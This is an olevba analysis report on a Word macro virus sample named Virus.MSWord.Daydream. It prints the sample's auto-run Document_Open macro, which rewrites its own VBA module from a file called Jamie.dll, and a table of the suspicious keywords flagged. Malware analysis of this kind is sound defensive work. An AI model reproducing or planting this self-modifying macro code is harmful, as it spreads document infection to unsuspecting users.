olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Daydream-03864838abf25fab8971005ceae29447bfb2fb84
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Daydream-03864838abf25fab8971005ceae29447bfb2fb84 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
For x = 1 To ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
.DeleteLines 1
Next
End With
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\WINDOWS\SYSTEM\Jamie.dll")
For x = 1 To ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Find("Private Sub Document_Close()", 1, 1, 1, 30, True, True, True) = False Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1
Next
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Jamie.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

